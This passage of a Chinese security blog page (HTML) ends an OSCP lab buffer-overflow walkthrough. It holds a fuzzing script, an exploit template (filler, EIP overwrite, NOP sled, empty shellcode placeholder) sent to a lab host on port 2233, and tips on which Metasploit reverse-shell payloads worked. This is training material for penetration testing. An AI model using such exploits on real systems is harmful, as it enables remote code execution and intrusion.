class="line"></span><br><span class="line">for string in buffer:</span><br><span class="line">    print &quot;Fuzzing with %s bytes&quot; % len(string)</span><br><span class="line">    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM) </span><br><span class="line">    connect=s.connect((&apos;192.168.17.141&apos;,2233))</span><br><span class="line">    s.send((string))</span><br><span class="line">    s.close()</span><br></pre></td></tr></table></figure>
+<p>msf开启监听，重新管理员运行目标程序，运行脚本发现可反弹shell</p>
+<p><img src="https://i.loli.net/2021/02/18/fw6CS1gbmQJtxTj.png" alt="clipboard.png"></p>
+<hr>
+<p>下面也附上官方POC脚本格式</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">import socket</span><br><span class="line">try:</span><br><span class="line"> print &quot;\nSending evil buffer...&quot;</span><br><span class="line"> filler = &quot;A&quot; * 2306</span><br><span class="line"> eip = &quot;\x0d\x11\x20\x11&quot;</span><br><span class="line"> offset = &quot;C&quot; * 4</span><br><span class="line"> nops = &quot;\x90&quot; * 10</span><br><span class="line">  shellcode = (&quot;\x&quot;)</span><br><span class="line">  </span><br><span class="line"> buffer = filler + eip + offset + nops + shellcode</span><br><span class="line"></span><br><span class="line"> s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"> s.connect((&quot;192.168.17.139&quot;, 2233))</span><br><span class="line"> s.send(buffer)</span><br><span class="line"> s.close()</span><br><span class="line"> print &quot;\nDone did you get a reverse shell?&quot;</span><br><span class="line">except:</span><br><span class="line"> print &quot;\nCould not connect!&quot;</span><br></pre></td></tr></table></figure>
+
+<p>注意，最后shellcode的payload的选择需要多试试，在oscp靶场中windows/shell_reverse_tcp适用，但另外一个不适用，在本地win7里windows/meterpreter/reverse_tcp适用，另外一个不适用</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/OSCP/" rel="tag"><i class="fa fa-tag"></i> OSCP</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-next post-nav-item">
+                <a href="/2020/11/27/ReverseShell%E6%B8%85%E5%8D%95/" rel="next" title="ReverseShell清单">
+                  <i class="fa fa-chevron-left"></i> ReverseShell清单
+                </a>
+            </div>
+
+            <span class="post-nav-divider"></span>
+
+            <div class="post-nav-prev post-nav-item">
+                <a href="/2021/02/18/OSCP%E6%80%BB%E7%BB%93/" rel="prev" title="OSCP总结">
+                  OSCP总结 <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+  </div>
+
+
+          </div>
+          
+    
+  <div class="comments" id="comments">
+    <div id="lv-container" data-id="city" data-uid="MTAyMC80NzQ3My8yMzk3Mw=="></div>
+  </div>
+  
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#复现崩溃"><span class="nav-number">1.</span> <span class="nav-text">复现崩溃</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#寻找EIP"><span class="nav-number">2.</span> <span class="nav-text">寻找EIP</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#验证EIP"><span class="nav-number">3.</span> <span class="nav-text">验证EIP</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#查看shellcode空间是否足够（扩容测试）"><span class="nav-number">4.</span> <span class="nav-text">查看shellcode空间是否足够（扩容测试）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#寻找坏字符badchars"><span class="nav-number">5.</span> <span class="nav-text">寻找坏字符badchars</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#查找jmp-esp"><span class="nav-number">6.</span> <span class="nav-text">查找jmp esp</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#确认esp"><span class="nav-number">7.</span> <span class="nav-text">确认esp</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#生成shellcode"><span class="nav-number">8.</span> <span class="nav-text">生成shellcode</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="LionKing"
+      src="/images/avatar.jpeg">
+  <p class="site-author-name" itemprop="name">LionKing</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">68</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">11</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title">
+      <i class="fa fa-fw fa-link"></i>
+      Links
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="https://3gstudent.github.io/" title="https:&#x2F;&#x2F;3gstudent.github.io&#x2F;" rel="noopener" target="_blank">3gstudent</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://blog.hl0rey.com/archives/" title="https:&#x2F;&#x2F;blog.hl0rey.com&#x2F;archives&#x2F;" rel="noopener" target="_blank">hl0rey</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://www.cnblogs.com/micr067/" title="https:&#x2F;&#x2F;www.cnblogs.com&#x2F;micr067&#x2F;" rel="noopener" target="_blank">Micr067</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://patrilic.top/archives/" title="https:&#x2F;&#x2F;patrilic.top&#x2F;archives&#x2F;" rel="noopener" target="_blank">Patrilic</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://me.csdn.net/qq_29647709" title="https:&#x2F;&#x2F;me.csdn.net&#x2F;qq_29647709" rel="noopener" target="_blank">tdcoming</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://uknowsec.cn/" title="https:&#x2F;&#x2F;uknowsec.cn&#x2F;" rel="noopener" target="_blank">uknow</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://422926799.github.io/" title="https:&#x2F;&#x2F;422926799.github.io&#x2F;" rel="noopener" target="_blank">九世</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://payloads.online/" title="https:&#x2F;&#x2F;payloads.online&#x2F;" rel="noopener" target="_blank">倾旋</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://wiki.17-apt.tk/" title="https:&#x2F;&#x2F;wiki.17-apt.tk&#x2F;" rel="noopener" target="_blank">BugMan</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://www.se7ensec.cn/" title="http:&#x2F;&#x2F;www.se7ensec.cn&#x2F;" rel="noopener" target="_blank">se7en</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://attack.mitre.org/matrices/enterprise/" title="https:&#x2F;&#x2F;attack.mitre.org&#x2F;matrices&#x2F;enterprise&#x2F;" rel="noopener" target="_blank">ATT&CK</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://www.fireeye.com/blog.html" title="https:&#x2F;&#x2F;www.fireeye.com&#x2F;blog.html" rel="noopener" target="_blank">FireEye</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://vincentyiu.com/" title="https:&#x2F;&#x2F;vincentyiu.com&#x2F;" rel="noopener" target="_blank">Vincent Yiu</a>
+        </li>
+    </ul>
+  </div>
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">LionKing</span>
+</div>
+
+<!--
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> 强力驱动 v4.0.0
+  </div>
+  <span class="post-meta-divider">|</span>
+  <div class="theme-info">主题 – <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> v7.5.0
+  </div>
+
+-->
+
+
+
+    <script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span id="busuanzi_container_site_pv">总访问量<span id="busuanzi_value_site_pv"></span>次</span>
+    <span class="post-meta-divider">|</span>
+    <span id="busuanzi_container_site_uv">总访客<span id="busuanzi_value_site_uv"></span>人</span>
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+</div>
+
+
+
+
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/pangu@4/dist/browser/pangu.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+<script src="/js/utils.js"></script><script src="/js/motion.js"></script>
+<script src="/js/schemes/pisces.js"></script>
+<script src="/js/next-boot.js"></script>
+
+
+
+  
+
+
+
+
+  <script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+<script>
+  window.livereOptions = {
+    refer: location.pathname.replace(CONFIG.root, '').replace('index.html', '')
+  };
+  (function(d, s) {
+    var j, e = d.getElementsByTagName(s)[0];
+    if (typeof LivereTower === 'function') { return; }
+    j = d.createElement(s);
+    j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+    j.async = true;
+    e.parentNode.insertBefore(j, e);
+  })(document, 'script');
+</script>
+
+</body>
+</html>
